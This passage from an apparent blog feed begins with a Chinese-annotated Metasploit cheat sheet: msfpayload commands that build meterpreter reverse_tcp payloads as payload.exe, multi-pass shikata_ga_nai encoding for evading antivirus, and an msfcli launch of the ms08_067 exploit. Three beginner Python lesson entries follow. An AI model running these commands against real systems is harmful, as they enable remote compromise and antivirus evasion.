创建一个metasploit的reverse_tcp攻击载荷，回连到LHOSTip的LPORT，将其保存为名为payload.exe的windows下可执行程序。<br>
msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT R &gt; payload.raw<br>
创建一个metasploit的reverse_tcp攻击载荷，回连到LHOSTip的LPORT，将其保存为名为payload.raw，该文件后面的msffencode中使用。<br>
msfpayload windows/meterpreter/reverse_tcp LPORT=PORT C &gt; payload.c<br>
创建一个metasploit的reverse_tcp攻击载荷，导出C格式的shellcode。<br>
msfpayload windows/meterpreter/reverse_tcp LPORT=PORT J &gt; payload.java<br>
创建一个metasploit的reverse_tcp攻击载荷，导出成以%u编码方式的javaScript语言字符串。<br>
msfencode命令<br>
mefencode -h<br>
列出msfencode的帮助命令。<br>
msfencode -l<br>
列出所有可用的编码器。<br>
msfencode -t (c,elf,exe,java,is_le,js_be,perl,raw,ruby,vba,vbs,loop_vbs,asp,war,macho)<br>
显示编码缓冲区的格式。<br>
msfencode -i payload.raw -o encoded_payload.exe -e x86/shikata_ga_nai -c 5 -t exe<br>
使用shikata_ga_nai编码器对payload.raw文件进行5编码，然后导出一个名为encoded_payload.exe的文件。<br>
msfpayload windows/meterpreter/bind_tcp LPORT=PORT R | msfencode -e x86/_countdown -c 5 -t raw | msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded_payload.exe<br>
创建一个经过多种编码格式嵌套编码的攻击载荷。<br>
msfencode -i payload.raw BufferRegister=ESI -e x86/alpja_mixed -t c<br>
创建一个纯字母数字的shellcode，由ESI寄存器只想shellcode，以C语言格式输出。<br>
MSFcli命令<br>
msfcli | grep exploit<br>
仅列出渗透攻击模块。<br>
msfcli | grep exploit/windows<br>
仅列出与windows相关的渗透攻击模块。<br>
msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp LPORT=PORT RHOST=IP E<br>
对IP发起ms08_067_netapi渗透攻击，配置了bind_tcp攻击载荷，并绑定在PORT端口进行监听</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[day07]]></title>
        <id>https://itxz.fun/post/day07/</id>
        <link href="https://itxz.fun/post/day07/">
        </link>
        <updated>2020-04-23T04:41:40.000Z</updated>
        <content type="html"><![CDATA[<p>01 今日内容大纲</p>
<ol>
<li>基础数据类型的补充</li>
<li>数据类型之间的转换</li>
<li>编码的进阶<br>
02 昨日内容回顾以及作业讲解</li>
<li>id == is：<br>
== ：数值是否相同 is：内存地址，id 获取对象的内存地址</li>
<li>代码块：一个文件，交互式命令一行就是一个代码块。</li>
<li>同一代码块下缓存机制（字符串驻留机制）：<br>
所有数字，bool 几乎所有的字符串<br>
优点：提升性能，节省内存空间。</li>
<li>不同代码块的缓存机制（小数据池）：在内存中开辟两个空间，一个空间存储-5~256的int，一个空间存储一定<br>
规则的字符串，如果你的代码中遇到了满足条件的数据，直接引用提前创建的。<br>
-5~256 int，bool，满足一定规则的字符串。<br>
优点：提升性能，节省内存空间。</li>
<li>集合：列表去重，关系测试 交并差。</li>
<li>深浅copy：<br>
浅copy：在内存中开辟一个新的空间存放copy的对象（列表，字典），但是里面的所有元素与被copy对象<br>
的里面的元素共用一个。<br>
03 具体内容<br>
数据类型的补充<br>
str</li>
</ol>
<h1 id="str-补充的方法练习一遍就行">str ：补充的方法练习一遍就行。</h1>
<h1 id="s1-taibai">s1 = 'taiBAi'</h1>
<h1 id="capitalize-首字母大写其余变小写">capitalize 首字母大写，其余变小写</h1>
<h1 id="prints1capitalize">print(s1.capitalize())</h1>
<h1 id="swapcase-大小写翻转">swapcase 大小写翻转</h1>
<h1 id="prints1swapcase">print(s1.swapcase())</h1>
<h1 id="title">title</h1>
<h1 id="msg-taibai-say3hi">msg= 'taibai say3hi'</h1>
<h1 id="printmsgtitle-每个单词的首字母大写">print(msg.title()) #每个单词的首字母大写</h1>
<p>元组<br>
列表<br>
s1 = 'barry'</p>
<h1 id="居中">居中</h1>
<h1 id="prints1center20">print(s1.center(20))</h1>
<h1 id="prints1center20-2">print(s1.center(20,'*'))</h1>
<h1 id="find-通过元素找索引找到第一个就返回找不到-返回-1">find :通过元素找索引，找到第一个就返回，找不到 返回-1</h1>
<h1 id="index通过元素找索引找到第一个就返回找不到-报错">index:通过元素找索引，找到第一个就返回，找不到 报错</h1>
<h1 id="prints1finda">print(s1.find('a'))</h1>
<h1 id="prints1findr">print(s1.find('r'))</h1>
<h1 id="prints1findo">print(s1.find('o'))</h1>
<h1 id="prints1indexo">print(s1.index('o'))</h1>
<h1 id="tuple">tuple</h1>
<h1 id="元组中如果只有一个元素并且没有逗号那么它不是元组它与改元素的数据类型一致">元组中如果只有一个元素，并且没有逗号，那么它不是元组，它与改元素的数据类型一致。 ***</h1>
<h1 id="tu1-234">tu1 = (2,3,4)</h1>
<h1 id="tu1-2">tu1 = (2)</h1>
<h1 id="tu1-太白">tu1 = ('太白')</h1>
<h1 id="tu1-123">tu1 = ([1,2,3])</h1>
<h1 id="tu1-1">tu1 = (1,)</h1>
<h1 id="printtu1typetu1">print(tu1,type(tu1))</h1>
<h1 id="tu-12333223">tu = (1,2,3,3,3,2,2,3,)</h1>
<h1 id="count-计数"># count 计数</h1>
<h1 id="printtucount3">print(tu.count(3))</h1>
<h1 id="tu-太白-日天-太白">tu = ('太白', '日天', '太白')</h1>
<h1 id="index"># index</h1>
<h1 id="printtuindex太白">print(tu.index('太白'))</h1>
<h1 id="l1-太白-123-女神-大壮">l1 = ['太白', '123', '女神', '大壮']</h1>
<h1 id="count-pass">count pass</h1>
<h1 id="index-2">index</h1>
<h1 id="printl1index大壮">print(l1.index('大壮'))</h1>
<h1 id="sort">sort **</h1>
<h1 id="l1-5-4-3-7-8-6-1-9">l1 = [5, 4, 3, 7, 8, 6, 1, 9]</h1>
<h1 id="l1sort-默认从小到大排序"># l1.sort() # 默认从小到大排序</h1>
<h1 id="l1sortreversetrue-从大到小排序"># l1.sort(reverse=True) # 从大到小排序 **</h1>
<h1 id="l1reverse-反转">l1.reverse() # 反转 **</h1>
<h1 id="printl1">print(l1)</h1>
<h1 id="列表可以相加">列表可以相加</h1>
<h1 id="l1-1-2-3">l1 = [1, 2, 3]</h1>
<h1 id="l2-1-2-3-太白-123-女神">l2 = [1, 2, 3, '太白', '123', '女神']</h1>
<h1 id="printl1-l2">print(l1 + l2)</h1>
<h1 id="列表与数字相乘">列表与数字相乘</h1>
<h1 id="l1-1-daf-3">l1 = [1, 'daf', 3]</h1>
<h1 id="l2-l13">l2 = l1*3</h1>
<h1 id="printl2">print(l2)</h1>
<p>字典<br>
l1 = [11, 22, 33, 44, 55]</p>
<h1 id="索引为奇数对应的元素删除不能一个一个删除此l1只是举个例子里面的元素不定">索引为奇数对应的元素删除（不能一个一个删除，此l1只是举个例子，里面的元素不定）。</h1>
<h1 id="重要">*** 重要</h1>
<h1 id="正常思路">正常思路：</h1>
<h1 id="先将所有的索引整出来">先将所有的索引整出来。</h1>
<h1 id="加以判断index-2-1-popindex"># 加以判断，index % 2 == 1： pop（index）</h1>
<h1 id="for-index-in-rangelenl1">for index in range(len(l1)):</h1>
<h1 id="if-index-2-1">if index % 2 == 1:</h1>
<h1 id="l1popindex">l1.pop(index)</h1>
<h1 id="printl1-2">print(l1)</h1>
<h1 id="列表的特性">列表的特性：</h1>
<h1 id="l1-11-22-33-44-55">l1 = [11, 22, 33, 44, 55]</h1>
<h1 id="最简单的">最简单的：</h1>
<h1 id="del-l112">del l1[1::2]</h1>
<h1 id="printl1-3">print(l1)</h1>
<h1 id="l1-11-22-33-44-55-2">l1 = [11, 22, 33, 44, 55]</h1>
<h1 id="倒序法删除元素"># 倒序法删除元素</h1>
<h1 id="for-index-in-rangelenl1-1-1-1">for index in range(len(l1)-1,-1,-1):</h1>
<h1 id="if-index-2-1-2">if index % 2 == 1:</h1>
<h1 id="l1popindex-2">l1.pop(index)</h1>
<h1 id="printl1-4">print(l1)</h1>
<h1 id="思维置换">思维置换</h1>
<h1 id="l1-11-22-33-44-55-3">l1 = [11, 22, 33, 44, 55]</h1>
<h1 id="new_l1">new_l1 = []</h1>
<h1 id="for-index-in-rangelenl1-2">for index in range(len(l1)):</h1>
<h1 id="if-index-2-0">if index % 2 ==0:</h1>
<h1 id="new_l1appendl1index">new_l1.append(l1[index])</h1>
<h1 id="printnew_l1"># print(new_l1)</h1>
<h1 id="l1-new_l1">l1 = new_l1</h1>
<h1 id="printl1-5">print(l1)</h1>
<h1 id="循环一个列表的时最好不要改变列表的大小这样会影响你的最终的结果">循环一个列表的时，最好不要改变列表的大小，这样会影响你的最终的结果。</h1>
<h1 id="字典的补充">字典的补充</h1>
<h1 id="update">update ***</h1>
<h1 id="dic-name-太白-age-18">dic = {'name': '太白', 'age': 18}</h1>
<h1 id="dicupdatehobby运动-hight175"># dic.update(hobby='运动', hight='175')</h1>
<h1 id="dicupdatename太白金星"># dic.update(name='太白金星')</h1>
<h1 id="dicupdate1-a2-b3-c4-d-面试会考">dic.update([(1, 'a'),(2, 'b'),(3, 'c'),(4, 'd')]) # 面试会考</h1>
<h1 id="printdic">print(dic)</h1>
<h1 id="dic1-namejinage18sexmale">dic1 = {&quot;name&quot;:&quot;jin&quot;,&quot;age&quot;:18,&quot;sex&quot;:&quot;male&quot;}</h1>
<h1 id="dic2-namealexweight75">dic2 = {&quot;name&quot;:&quot;alex&quot;,&quot;weight&quot;:75}</h1>
<h1 id="dic1updatedic2-更新有则覆盖无责添加">dic1.update(dic2) # 更新，有则覆盖，无责添加</h1>
<h1 id="printdic1-name-alex-age-18-sex-male-weight-75">print(dic1) # {'name': 'alex', 'age': 18, 'sex': 'male', 'weight': 75}</h1>
<h1 id="printdic2">print(dic2)</h1>
<p>数据类型的转换<br>
数据类型的分类（了解）<br>
编码的进阶<br>
ASCII码：包含英文字母，数字，特殊字符与01010101对应关系。<br>
a 01000001 一个字符一个字节表示。<br>
GBK：只包含本国文字（以及英文字母，数字，特殊字符）与0101010对应关系。<br>
a 01000001 ascii码中的字符：一个字符一个字节表示。<br>
中 01001001 01000010 中文：一个字符两个字节表示。<br>
Unicode：包含全世界所有的文字与二进制0101001的对应关系。<br>
a 01000001 01000010 01000011 00000001<br>
b 01000001 01000010 01100011 00000001</p>
<h1 id="fromkeys">fromkeys</h1>
<h1 id="dic-dictfromkeysabc-100">dic = dict.fromkeys('abc', 100)</h1>
<h1 id="dic-dictfromkeys1-2-3-alex">dic = dict.fromkeys([1, 2, 3], 'alex')</h1>
<h1 id="坑值共有一个面试题">坑：值共有一个,面试题</h1>
<h1 id="dic-dictfromkeys123">dic = dict.fromkeys([1,2,3],[])</h1>
<h1 id="dic1append666">dic[1].append(666)</h1>
<h1 id="printdic-2">print(dic)</h1>
<p>dic = {'k1': '太白', 'k2': 'barry', 'k3': '白白', 'age': 18}</p>
<h1 id="将字典中键含有k元素的键值对删除">将字典中键含有'k'元素的键值对删除。</h1>
<h1 id="for-key-in-dic">for key in dic:</h1>
<h1 id="if-k-in-key">if 'k' in key:</h1>
<h1 id="dicpopkey">dic.pop(key)</h1>
<h1 id="printdic-3">print(dic)</h1>
<h1 id="循环一个字典时如果改变这个字典的大小就会报错">循环一个字典时，如果改变这个字典的大小，就会报错。</h1>
<h1 id="l1">l1 = []</h1>
<h1 id="for-key-in-dic-2">for key in dic:</h1>
<h1 id="if-k-in-key-2">if 'k' in key:</h1>
<h1 id="l1appendkey">l1.append(key)</h1>
<h1 id="printl1-6">print(l1)</h1>
<h1 id="for-i-in-l1">for i in l1:</h1>
<h1 id="dicpopi">dic.pop(i)</h1>
<h1 id="printdic-4">print(dic)</h1>
<h1 id="for-key-in-listdickeys-k1-k2-k3age">for key in list(dic.keys()): # ['k1', 'k2', 'k3','age']</h1>
<h1 id="if-k-in-key-3">if 'k' in key:</h1>
<h1 id="dicpopkey-2">dic.pop(key)</h1>
<h1 id="printdic-5">print(dic)</h1>
<h1 id="0setnone-转换成bool值为false">0,''(),[],{},set(),None 转换成bool值为False</h1>
<p>中 01001001 01000010 01100011 00000001<br>
UTF-8:包含全世界所有的文字与二进制0101001的对应关系（最少用8位一个字节表示一个字符）。<br>
a 01000001 ascii码中的字符：一个字符一个字节表示。<br>
To 01000001 01000010 (欧洲文字：葡萄牙，西班牙等)一个字符两个字节表示。<br>
中 01001001 01000010 01100011 亚洲文字；一个字符三个字节表示。</p>
<ol>
<li>不同的密码本之间能否互相识别？不能。</li>
<li>数据在内存中全部是以Unicode编码的，但是当你的数据用于网络传输或者存储到硬盘中，必须是以非<br>
Unicode编码（utf-8,gbk等等）。<br>
英文：<br>
str： 'hello '<br>
内存中的编码方式： Unicode<br>
表现形式： 'hello'<br>
bytes ：<br>
内存中的编码方式： 非Unicode<br>
表现形式：b'hello'<br>
中文：<br>
str：<br>
内存中的编码方式： Unicode<br>
表现形式：'中国'<br>
bytes ：<br>
内存中的编码方式： 非Unicode # Utf-8<br>
表现形式：b'\xe4\xb8\xad\xe5\x9b\xbd'</li>
</ol>
<h1 id="str-bytes">str ---&gt; bytes\</h1>
<h1 id="s1-中国">s1 = '中国'</h1>
<h1 id="b1-s1encodeutf-8-编码">b1 = s1.encode('utf-8') # 编码</h1>
<h1 id="printb1typeb1-bxe4xb8xadxe5x9bxbd">print(b1,type(b1)) # b'\xe4\xb8\xad\xe5\x9b\xbd'</h1>
<h1 id="b1-s1encodegbk-编码-bxd6xd0xb9xfa-class-bytes"># b1 = s1.encode('gbk') # 编码 # b'\xd6\xd0\xb9\xfa' &lt;class 'bytes'&gt;</h1>
<h1 id="bytes-str"># bytes----&gt;str</h1>
<h1 id="b1-bxe4xb8xadxe5x9bxbd">b1 = b'\xe4\xb8\xad\xe5\x9b\xbd'</h1>
<h1 id="s2-b1decodeutf-8-解码">s2 = b1.decode('utf-8') # 解码</h1>
<h1 id="prints2">print(s2)</h1>
<p>04 今日总结<br>
数据类型的补充： list（sort,revrse,列表的相加，乘，循环问题），dict （update 循环问题） ***<br>
编码的进阶：<br>
bytes为什么存在？<br>
str ---&gt;bytes(Unicode ---&gt; 非Unicode)<br>
gbk &lt;-----&gt; utf-8<br>
05 预习内容<br>
预习内容：<br>
文件操作，博客地址：http://www.cnblogs.com/jin-xin/articles/8183203.html</p>
<h1 id="gbk-utf-8">gbk ---&gt; utf-8</h1>
<p>b1 = b'\xd6\xd0\xb9\xfa'<br>
s = b1.decode('gbk')</p>
<h1 id="prints">print(s)</h1>
<p>b2 = s.encode('utf-8')<br>
print(b2) # b'\xe4\xb8\xad\xe5\x9b\xbd'</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[day06(深浅copy 集合)]]></title>
        <id>https://itxz.fun/post/day06/</id>
        <link href="https://itxz.fun/post/day06/">
        </link>
        <updated>2020-04-23T03:58:03.000Z</updated>
        <content type="html"><![CDATA[<p>01 今日内容大纲</p>
<ol>
<li>is == id 用法</li>
<li>代码块</li>
<li>同一代码块下的缓存机制</li>
<li>不同代码块下的缓存机制（小数据池）</li>
<li>总结</li>
<li>集合（了解）</li>
<li>深浅copy<br>
02 昨日回顾以及作业讲解</li>
<li>字典初始：<br>
查询速度快，{'name': '太白'}, 存储大量的关联型数据。<br>
键：必须是不可变的数据类型（int，str，bool，tuple），唯一的。<br>
值：任意数据类型，对象。<br>
字典3.5x 之前无序的，3.6x 按照初始时的顺序排列，3.7之后有序的。</li>
<li>增删改查：<br>
增：setdefualt(), dic['age'] = 18<br>
删：pop 键(可以设置返回值)。clear 清空，del dic['name']<br>
改：dic['name'] = 'wusir'<br>
dic['name'] dic.get('name') dic.keys() dic.values() dic.items()</li>
<li>字典的嵌套。<br>
03 具体内容</li>
<li>id is ==</li>
</ol>
<h1 id="id-身份证号">id 身份证号</h1>
<h1 id="i-100">i = 100</h1>
<h1 id="s-alex">s = 'alex'</h1>
<h1 id="printidi">print(id(i))</h1>
<h1 id="printids">print(id(s))</h1>
<h1 id="比较的是两边的值是否相等">== 比较的是两边的值是否相等</h1>
<h1 id="l1-1-2-3">l1 = [1, 2, 3]</h1>
<h1 id="l2-1-2-3">l2 = [1, 2, 3]</h1>
<h1 id="printl1-l2">print(l1 == l2)</h1>
<h1 id="s1-alex">s1 = 'alex'</h1>
<h1 id="s2-alex">s2 = 'alex '</h1>
<h1 id="prints1-s2">print(s1 == s2)</h1>
<h1 id="is-判断的是内存地址是否相同">is 判断的是内存地址是否相同</h1>
<h1 id="l1-1-2-3-2">l1 = [1, 2, 3]</h1>
<ol start="2">
<li>代码块<br>
代码块：我们所有的代码都需要依赖代码块执行。<br>
一个文件就是一个代码块。<br>
交互式命令下一行就是一个代码块。</li>
<li>两个机制： 同一个代码块下，有一个机制。不同的代码块下，遵循另一个机制。</li>
<li>同一个代码块下的缓存机制。<br>
前提条件：同一个代码块内。</li>
</ol>
<h1 id="l2-1-2-3-2">l2 = [1, 2, 3]</h1>
<h1 id="printidl1">print(id(l1))</h1>
<h1 id="printidl2">print(id(l2))</h1>
<h1 id="printl1-is-l2">print(l1 is l2)</h1>
<p>s1 = 'alex'<br>
s2 = 'alex'<br>
print(id(s1))<br>
print(id(s2))<br>
print(s1 is s2)</p>
<h1 id="id-相同值一定相同">id 相同，值一定相同</h1>
<h1 id="值相同id不一定相同">值相同，id不一定相同</h1>
<p>机制内容：pass<br>
适用的对象： int bool str<br>
具体细则：所有的数字，bool，几乎所有的字符串。<br>
优点：提升性能，节省内存。<br>
5. 不同代码块下的缓存机制： 小数据池。<br>
前提条件：不同代码块内。<br>
机制内容：pass<br>
适用的对象： int bool str<br>
具体细则：-5~256数字，bool，满足规则的字符串。<br>
优点：提升性能，节省内存。</p>
<h1 id="i1-1000">i1 = 1000</h1>
<h1 id="i2-1000">i2 = 1000</h1>
<h1 id="i3-1000">i3 = 1000</h1>
<h1 id="l1-123">l1 = [1,2,3]</h1>
<h1 id="l2-123">l2 = [1,2,3]</h1>
<h1 id="printidl1-2">print(id(l1))</h1>
<h1 id="printidl2-2">print(id(l2))</h1>
<h1 id="printidi1">print(id(i1))</h1>
<h1 id="printidi2">print(id(i2))</h1>
<h1 id="printidi3">print(id(i3))</h1>
<p>i = 800<br>
i1 = 800<br>
s1 = 'hfdjka6757fdslslgaj@!#fkdjlsafjdskl;fjds中国'<br>
s2 = 'hfdjka6757fdslslgaj@!#fkdjlsafjdskl;fjds中国'<br>
print(i is i1)<br>
print(s1 is s2)</p>
<ol>
<li>总结：+</li>
<li>面试题考。</li>
<li>回答的时候一定要分清楚：同一个代码块下适用一个缓存机制。不同的代码块下适用另一个缓存机制（小<br>
数据池）</li>
<li>小数据池：数字的范围是-5~256.</li>
<li>缓存机制的优点：提升性能，节省内存。</li>
<li>python基础数据类型之：集合 set。容器型的数据类型，它要求它里面的元素是不可变的数据，但是它本身是<br>
可变的数据类型。集合是无序的。{}。<br>
集合的作用：<br>
列表的去重。<br>
关系测试： 交集，并集，差集，.....<br>
pass</li>
</ol>
<h1 id="集合的创建">集合的创建：</h1>
<h1 id="set1-set1-3-barry-false">set1 = set({1, 3, 'Barry', False})</h1>
<h1 id="set1-1-3-太白金星-4-alex-false-武大">set1 = {1, 3, '太白金星', 4, 'alex', False, '武大'}</h1>
<h1 id="printset1">print(set1)</h1>
<h1 id="空集合">空集合：</h1>
<h1 id="print-type-空字典">print({}, type({})) # 空字典</h1>
<h1 id="set1-set">set1 = set()</h1>
<h1 id="printset1-2">print(set1)</h1>
<h1 id="集合的有效性测试">集合的有效性测试</h1>
<h1 id="set1-123-3-name-alex">set1 = {[1,2,3], 3, {'name': 'alex'}}</h1>
<h1 id="printset1-3">print(set1)</h1>
<h1 id="set1-太白金星-景女神-武大-三粗-alexsb-吴老师">set1 = {'太白金星', '景女神', '武大', '三粗', 'alexsb', '吴老师'}</h1>
<h1 id="增">增：</h1>
<h1 id="add">add</h1>
<h1 id="set1addxx">set1.add('xx')</h1>
<h1 id="printset1-4">print(set1)</h1>
<h1 id="update迭代着增加">update迭代着增加</h1>
<h1 id="set1updatefdsafgsd">set1.update('fdsafgsd')</h1>
<h1 id="printset1-5">print(set1)</h1>
<h1 id="删">删</h1>
<h1 id="remove">remove</h1>
<h1 id="remove-按照元素删除">remove 按照元素删除</h1>
<h1 id="set1removealexsb">set1.remove('alexsb')</h1>
<h1 id=""></h1>
<h1 id="printset1-6">print(set1)</h1>
<h1 id="pop-随即删除">pop 随即删除</h1>
<h1 id="set1pop">set1.pop()</h1>
<h1 id="printset1-7">print(set1)</h1>
<h1 id="变相改值">变相改值</h1>
<h1 id="set1remove太白金星">set1.remove('太白金星')</h1>
<h1 id="set1add男神">set1.add('男神')</h1>
<h1 id="printset1-8">print(set1)</h1>
<p>#关系测试：***</p>
<h1 id="交集">交集</h1>
<h1 id="set1-1-2-3-4-5">set1 = {1, 2, 3, 4, 5}</h1>
<h1 id="set2-4-5-6-7-8">set2 = {4, 5, 6, 7, 8}</h1>
<h1 id="printset1-set2">print(set1 &amp; set2)</h1>
<h1 id="并集">并集：</h1>
<h1 id="printset1-set2-2">print(set1 | set2)</h1>
<h1 id="差集-">差集 -</h1>
<h1 id="printset1-set2-3">print(set1 - set2)</h1>
<h1 id="反交集">反交集</h1>
<h1 id="printset1-set2-4">print(set1 ^ set2)</h1>
<h1 id="子集">子集</h1>
<h1 id="set1-123">set1 = {1,2,3}</h1>
<h1 id="set2-123456">set2 = {1,2,3,4,5,6}</h1>
<h1 id="printset1-set2-5"># print(set1 &lt; set2)</h1>
<h1 id="-2"></h1>
<h1 id="超集"># 超集</h1>
<h1 id="printset2-set1">print(set2 &gt; set1)</h1>
<h1 id="列表的去重">列表的去重 ***</h1>
<h1 id="l1-1太白-1-2-2-太白2-6-6-6-3-太白-4-5">l1 = [1,'太白', 1, 2, 2, '太白',2, 6, 6, 6, 3, '太白', 4, 5, ]</h1>
<h1 id="set1-setl1">set1 = set(l1)</h1>
<h1 id="l1-listset1">l1 = list(set1)</h1>
<ol start="3">
<li>深浅copy（面试会考）</li>
</ol>
<h1 id="printl1">print(l1)</h1>
<h1 id="用处数据之间的关系列表去重">用处：数据之间的关系，列表去重。</h1>
<h1 id="赋值运算">赋值运算</h1>
<h1 id="l1-1-2-3-22-33">l1 = [1, 2, 3, [22, 33]]</h1>
<h1 id="l2-l1">l2 = l1</h1>
<h1 id="l1append666">l1.append(666)</h1>
<h1 id="printl1-2">print(l1)</h1>
<h1 id="printl2">print(l2)</h1>
<h1 id="浅copy">浅copy</h1>
<h1 id="l1-1-2-3-22-33-2">l1 = [1, 2, 3, [22, 33]]</h1>
<h1 id="l2-l1copy">l2 = l1.copy()</h1>
<h1 id="l1append666-2">l1.append(666)</h1>
<h1 id="printl1idl1">print(l1,id(l1))</h1>
<h1 id="printl2idl2">print(l2,id(l2))</h1>
<h1 id="l1-1-2-3-22-33-3">l1 = [1, 2, 3, [22, 33]]</h1>
<h1 id="l2-l1copy-2">l2 = l1.copy()</h1>
<h1 id="l1-1append666">l1[-1].append(666)</h1>
<h1 id="printidl1-1">print(id(l1[-1]))</h1>
<h1 id="printidl2-1">print(id(l2[-1]))</h1>
<h1 id="printidl10">print(id(l1[0]))</h1>
<h1 id="printidl20">print(id(l2[0]))</h1>
<h1 id="printl1-3">print(l1)</h1>
<h1 id="printl2-2">print(l2)</h1>
<h1 id="l1-1-2-3-22-33-4">l1 = [1, 2, 3, [22, 33]]</h1>
<h1 id="l2-l1copy-3">l2 = l1.copy()</h1>
<h1 id="l10-90">l1[0] = 90</h1>
<h1 id="printl1-4">print(l1)</h1>
<h1 id="printl2-3">print(l2)</h1>
<h1 id="深copy">深copy</h1>
<h1 id="import-copy">import copy</h1>
<h1 id="l1-1-2-3-22-33-5">l1 = [1, 2, 3, [22, 33]]</h1>
<h1 id="l2-copydeepcopyl1">l2 = copy.deepcopy(l1)</h1>
<h1 id="printidl1-3"># print(id(l1))</h1>
<h1 id="printidl2-3"># print(id(l2))</h1>
<h1 id="l1-1append666-2">l1[-1].append(666)</h1>
<h1 id="printl1-5">print(l1)</h1>
<h1 id="printl2-4">print(l2)</h1>
<h1 id="相关面试题">相关面试题；</h1>
<h1 id="l1-1-2-3-22-33-6">l1 = [1, 2, 3, [22, 33]]</h1>
<h1 id="l2-l1-2">l2 = l1[:]</h1>
<h1 id="l1-1append666-3">l1[-1].append(666)</h1>
<h1 id="printl1-6">print(l1)</h1>
<h1 id="printl2-5">print(l2)</h1>
<h1 id="浅copy-list-dict-嵌套的可变的数据类型是同一个">浅copy： list dict: 嵌套的可变的数据类型是同一个。</h1>
<h1 id="深copy-list-dict-嵌套的可变的数据类型不是同一个">深copy： list dict: 嵌套的可变的数据类型不是同一个 。</h1>
<p>04 今日总结<br>
id is == 三个方法要会用，知道是做什么的。<br>
回答的时候一定要分清楚：同一个代码块下适用一个缓存机制。不同的代码块下适用另一个缓存机制（小数据<br>
池）<br>
小数据池：数字的范围是-5~256.<br>
缓存机制的优点：提升性能，节省内存。<br>
集合：列表去重，关系测试。<br>
深浅copy：理解浅copy，深浅copy,课上练习题整明白。<br>
05 预习内容<br>
数据类型的补充以及编码的进阶：https://www.cnblogs.com/jin-xin/articles/10577131.html</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[day05]]></title>
        <id>https://itxz.fun/post/day05/</id>
        <link href="https://itxz.fun/post/day05/">
        </link>
        <updated>2020-04-22T09:40:07.000Z</updated>
        <content type="html"><![CDATA[<p>今日内容大纲<br>
字典的初识<br>
字典的使用（增删改查）<br>
字典的嵌套<br>
02 内容回顾以及作业讲解<br>
列表：容器型数据类型，可以承载大量的数据，有序的数据。<br>
增：<br>
append 追加<br>
insert 插入<br>
extend 迭代着追加<br>
删：<br>
pop 按照索引删除。有返回值，默认删除最后一个<br>
remove 按照元素删除<br>
clear 清空<br>
del 索引，切片（步长）<br>
改：<br>
l1[1] = '大壮'<br>
l1[1:3] = 'fdsafdsafdhsjkf'<br>
l1[1:4:2] = '太白'<br>
查：索引，切片，for循环<br>
元组：只读列表，(), 拆包<br>
range：看做：可以自己控制范围的数字列表，但是它不是列表。<br>
03 具体内容<br>
字典的初识：</p>
<p>why：</p>
<p>列表可以存储大量的数据，数据之间的关联性不强<br>
['太白', 18, '男', '大壮', 3, '男']<br>
列表的查询速度比较慢。<br>
what：容器型数据类型：dict。</p>
<p>how：</p>
<p>数据类型的分类（可变与不可变）：</p>
<p>可变（不可哈希）的数据类型：list dict set<br>
不可变（可哈希）的数据类型： str bool int tuple<br>
字典：{}括起来，以键值对形式存储的容器型数据类型：</p>
<p>dic = {'太白':<br>
{'name': '太白金星','age': 18, 'sex': '男'},<br>
'python22期':<br>
['朱光亚', '大壮', '雪飞', '岑哥'],<br>
}<br>
键必须是不可变的数据类型：int , str (bool tuple几乎不用) 唯一的。</p>
<p>值可以是任意数据类型，对象。</p>
<p>字典3.5x版本之前（包括3.5）是无序的。</p>
<p>字典3.6x会按照初次建立字典的顺序排列，学术上不认为是有序的。</p>
<p>字典3.7x以后都是有序的。</p>
<p>字典的优点：查询速度非常快，存储关联性的数据。</p>
<p>字典的缺点：以空间换时间。</p>
<p>字典的创建方式：</p>
<h1 id="面试会考">面试会考</h1>
<h1 id="方式一">方式一：</h1>
<h1 id="dic-dictone-1-two-2-three-3">dic = dict((('one', 1), ('two', 2), ('three', 3)))</h1>
<h1 id="printdic-one-1-two-2-three-3">print(dic)  # {'one': 1, 'two': 2, 'three': 3}</h1>
<h1 id="方式二">方式二：</h1>
<h1 id="dic-dictone1-two2-three3">dic = dict(one=1, two=2, three=3)</h1>
<h1 id="printdic">print(dic)</h1>
<h1 id="方式三">方式三：</h1>
<h1 id="dic-dictone-1-two-2-three-3-2">dic = dict({'one': 1, 'two': 2, 'three': 3})</h1>
<h1 id="printdic-2">print(dic)</h1>
<p>验证字典的合法性：</p>
<p>dic = {[1,2,3]: 'alex', 1: 666}  # 键要不可变的数据类型<br>
print(dic)<br>
dic = {1: 'alex', 1: '太白', 2: 'wusir'}  # 键要唯一<br>
print(dic)<br>
字典的增删改查</p>
<p>dic = {'name': '太白', 'age': 18, 'hobby_list': ['直男', '钢管', '开车']}</p>
<h1 id="增">增：</h1>
<h1 id="直接增加-有则改之无则增加">直接增加 有则改之，无则增加</h1>
<h1 id="dicsex-男">dic['sex'] = '男'</h1>
<h1 id="dicage-23-改">dic['age'] = 23  # 改</h1>
<h1 id="printdic-3">print(dic)</h1>
<h1 id="setdefault-有则不变无则增加">setdefault  有则不变，无则增加</h1>
<h1 id="dicsetdefaulthobby">dic.setdefault('hobby')</h1>
<h1 id="dicsetdefaulthobby-球类运动">dic.setdefault('hobby', '球类运动')</h1>
<h1 id="dicsetdefaultage-45">dic.setdefault('age', 45)</h1>
<h1 id="printdic-4">print(dic)</h1>
<h1 id="删">删</h1>
<h1 id="pop-按照键删除键值对-有返回值">pop 按照键删除键值对, 有返回值  ***</h1>
<h1 id="设置第二个参数则无论字典中有无此键都不会报错">设置第二个参数则无论字典中有无此键都不会报错</h1>
<h1 id="dicpopage">dic.pop('age')</h1>
<h1 id="ret-dicpopage">ret = dic.pop('age')</h1>
<h1 id="ret-dicpophobby没有此键">ret = dic.pop('hobby','没有此键')</h1>
<h1 id="printret">print(ret)</h1>
<h1 id="printdic-5">print(dic)</h1>
<h1 id="clear-清空">clear  清空  **</h1>
<h1 id="dicclear">dic.clear()</h1>
<h1 id="printdic-6">print(dic)</h1>
<h1 id="del">del  **</h1>
<h1 id="del-dicage"># del dic['age']</h1>
<h1 id="del-dicage1">del dic['age1']</h1>
<h1 id="printdic-7">print(dic)</h1>
<h1 id="改">改</h1>
<h1 id="dicname-alex">dic['name'] = 'alex'</h1>
<h1 id="printdic-8">print(dic)</h1>
<h1 id="查">查</h1>
